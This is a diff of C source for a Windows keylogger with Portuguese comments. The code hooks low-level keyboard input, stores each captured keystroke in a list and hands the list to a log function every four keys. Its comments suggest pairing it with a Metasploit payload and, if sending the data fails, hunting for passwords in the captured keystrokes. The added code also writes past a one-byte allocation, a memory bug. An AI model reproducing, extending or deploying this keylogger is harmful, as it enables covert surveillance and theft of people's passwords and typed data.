@@ -2,15 +2,19 @@
 #include <winuser.h>
 #include <stdio.h>
 #include <stdbool.h>
+#include "log.h"
+#define LIMITE_TECLAS 4
 int iniciaThread(char* argv[]);
 DWORD WINAPI KeyLogger(LPVOID lpParameter);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 int capsLockAtivado(void);
-
+struct lista* lst = NULL;
+int contadorTeclas = 0;
 //Sugestão payload: metaexploit
 //se nao conseguir enviar, tentar identificar senhas nas teclagens
 
 int iniciaThread(char* argv[]) {
+	lst = NULL;
 	HANDLE thread;
 	
 	thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger,
@@ -74,6 +78,7 @@ LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 						// Caracteres 0-9
 					{
 					case 0x30:
+						
 						printf(")");
 						break;
 					case 0x31:
@@ -118,6 +123,11 @@ LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 					vkCode += 32; // Converte letras em minúscula
 				}
 				printf( "%c", vkCode);
+				char* str = (char*)malloc(sizeof(char));
+				unsigned int teste = (unsigned int)vkCode;
+				str[0] =(char) teste ;
+				str[1] = '\0';
+				lst = inserir(lst, str);
 			}
 			else // Outras teclas
 			{
@@ -431,6 +441,12 @@ LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 					GetKeyNameText(dwMsg, key, 15);
 					printf("%s", key);
 				}
+		
+			}
+			contadorTeclas++;
+			if (contadorTeclas == LIMITE_TECLAS) {
+				log(lst);
+				
 			}
 			break;
 			
